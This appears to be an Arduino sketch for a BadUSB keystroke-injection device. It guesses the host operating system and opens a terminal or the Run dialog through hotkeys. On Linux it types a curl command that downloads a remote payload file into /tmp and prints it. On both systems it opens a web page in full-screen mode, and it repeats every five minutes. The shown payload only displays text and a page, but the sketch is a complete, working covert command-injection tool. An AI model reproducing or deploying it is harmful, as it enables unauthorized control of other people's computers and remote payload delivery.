#include "FingerprintUSBHost.h"
#include "Keyboard.h"

void setup() {
    Keyboard.begin();
    delay(2000);
}

void run_linux(){
  //writeAltCode("run_linux_func"); //doesnt work :(
  // Open terminal using hotkeys
  Keyboard.releaseAll();
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(2200);
  Keyboard.println("curl https://raw.githubusercontent.com/temka1603/BadUSB/main/payloads/cyberok_var2.txt -s -o /tmp/cyberok.txt ;  cat /tmp/cyberok.txt");
  delay(200);
  Keyboard.println("python -mwebbrowser https://temka1603.github.io/cyberok-badusb");
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.press(KEY_F11);
  Keyboard.releaseAll();
  delay(300);
}

void run_windows(){
    // Open terminal using hotkeys
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(30);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.println("https://temka1603.github.io/cyberok-badusb");
  Keyboard.releaseAll();
  delay(4000);
  Keyboard.press(KEY_F11);
  Keyboard.releaseAll();
  delay(300);
}

// put your main code here, to run repeatedly:
void loop() {
    String os;
    FingerprintUSBHost.guessHostOS(os);

    if (os == "Windows"){
      run_windows();
    }
    else{
      run_linux();
    }
    
    delay(300000); //wait for 5 minutes ;)
}
